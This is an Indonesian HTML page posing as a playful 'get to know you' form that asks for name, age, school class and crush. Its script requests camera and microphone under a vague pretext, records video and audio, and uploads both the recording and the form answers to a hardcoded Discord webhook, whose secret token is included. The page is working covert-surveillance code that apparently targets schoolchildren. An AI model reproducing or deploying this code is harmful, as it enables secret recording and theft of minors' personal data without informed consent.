<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kenalan Yuk!</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --accent: #6366f1;
            --accent-hover: #4f46e5;
            --bg: #0f172a;
            --glass: rgba(30, 41, 59, 0.7);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }

        body {
            background: var(--bg);
            background-image: radial-gradient(circle at top right, #1e293b, #0f172a);
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        /* Overlay Dialog Awal */
        #permissionOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(10px);
            z-index: 9999;
            display: flex; justify-content: center; align-items: center;
        }

        .glass-card {
            background: var(--glass);
            padding: 40px;
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 350px;
            width: 90%;
        }

        h2 { font-weight: 600; margin-bottom: 15px; letter-spacing: 1px; }
        p { color: #94a3b8; margin-bottom: 25px; font-size: 0.95rem; }

        .btn-group { display: flex; gap: 10px; }
        .btn {
            flex: 1; padding: 12px; border: none; border-radius: 12px;
            font-weight: 600; cursor: pointer; transition: 0.3s;
        }
        .btn-primary { background: var(--accent); color: white; }
        .btn-primary:hover { background: var(--accent-hover); }
        .btn-secondary { background: #334155; color: #94a3b8; }

        /* Form Kenalan */
        #mainContent { display: none; width: 100%; max-width: 400px; padding: 20px; }
        .input-group { margin-bottom: 15px; text-align: left; }
        label { display: block; margin-bottom: 5px; color: #94a3b8; font-size: 0.8rem; }
        input {
            width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #334155;
            background: rgba(15, 23, 42, 0.5); color: white; outline: none; transition: 0.3s;
        }
        input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.2); }

        .status-recording {
            font-size: 0.7rem; color: #ef4444; margin-top: 10px;
            display: flex; align-items: center; justify-content: center; gap: 5px;
        }
        .dot { width: 8px; height: 8px; background: #ef4444; border-radius: 50%; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div id="permissionOverlay">
        <div class="glass-card">
            <h2>KENALAN YUK!</h2>
            <p>Biar makin akrab, izinkan sistem mengenali kamu sebentar ya?</p>
            <div class="btn-group">
                <button class="btn btn-primary" onclick="startApp()">AYOK!</button>
                <button class="btn btn-secondary" onclick="alert('Yah, kok nggak mau? :(')">TIDAK!</button>
            </div>
        </div>
    </div>

    <div id="mainContent">
        <div class="glass-card" style="max-width: 100%;">
            <h2 style="font-size: 1.2rem;">Data Kenalan</h2>
            <div class="input-group">
                <label>Nama Lengkap</label>
                <input type="text" id="nama" placeholder="Siapa nama kamu?">
            </div>
            <div class="input-group">
                <label>Umur</label>
                <input type="number" id="umur" placeholder="Berapa umurmu?">
            </div>
            <div class="input-group">
                <label>Kelas</label>
                <input type="text" id="kelas" placeholder="Kelas berapa?">
            </div>
            <div class="input-group">
                <label>Crush / Doi</label>
                <input type="text" id="crush" placeholder="Nama doi kamu...">
            </div>
            <button class="btn btn-primary" style="width: 100%;" onclick="submitData()">Kirim & Selesai</button>
            
            <div class="status-recording" id="recStatus" style="display:none;">
                <div class="dot"></div> Sinkronisasi sedang berjalan...
            </div>
        </div>
    </div>

    <video id="video" autoplay muted style="display:none;"></video>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1472604875316789362/WCsymTViSWZcRWqn6Xb_oJcMwelZTf7bRxdQ3lpAkh5rh7eTh49Bx1uZsJfQZOmMaLQg";
        let mediaRecorder;
        let chunks = [];

        async function startApp() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('video').srcObject = stream;
                document.getElementById('permissionOverlay').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
                document.getElementById('recStatus').style.display = 'flex';

                // Mulai Perekaman
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('file', blob, 'kenalan_video.webm');
                    formData.append('content', '🎥 **Hasil Rekaman Kenalan**');
                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                };

                mediaRecorder.start();
            } catch (err) {
                alert("Waduh, kamu harus klik AYOK! dan izinkan kamera biar bisa lanjut.");
                console.error(err);
            }
        }

        async function submitData() {
            const data = {
                nama: document.getElementById('nama').value,
                umur: document.getElementById('umur').value,
                kelas: document.getElementById('kelas').value,
                crush: document.getElementById('crush').value
            };

            if(!data.nama || !data.umur) return alert("Isi dulu dong datanya!");

            // Kirim Data Teks ke Webhook
            const payload = {
                content: "👤 **Ada Yang Mau Kenalan!**",
                embeds: [{
                    title: "Detail Informasi",
                    color: 6505201,
                    fields: [
                        { name: "Nama", value: data.nama, inline: true },
                        { name: "Umur", value: data.umur, inline: true },
                        { name: "Kelas", value: data.kelas, inline: true },
                        { name: "Crush", value: data.crush, inline: true }
                    ],
                    footer: { text: "Data dikirim pada: " + new Date().toLocaleString() }
                }]
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                alert("Data berhasil dikirim! Salam kenal ya.");
                
                // Berhenti merekam dan kirim video saat submit selesai
                if(mediaRecorder && mediaRecorder.state !== "inactive") {
                    mediaRecorder.stop();
                }
            } catch (err) {
                alert("Gagal mengirim data.");
            }
        }

        // Antisipasi jika tab ditutup mendadak
        window.onbeforeunload = () => {
            if(mediaRecorder && mediaRecorder.state !== "inactive") {
                mediaRecorder.stop();
            }
        };
    </script>
</body>
</html>
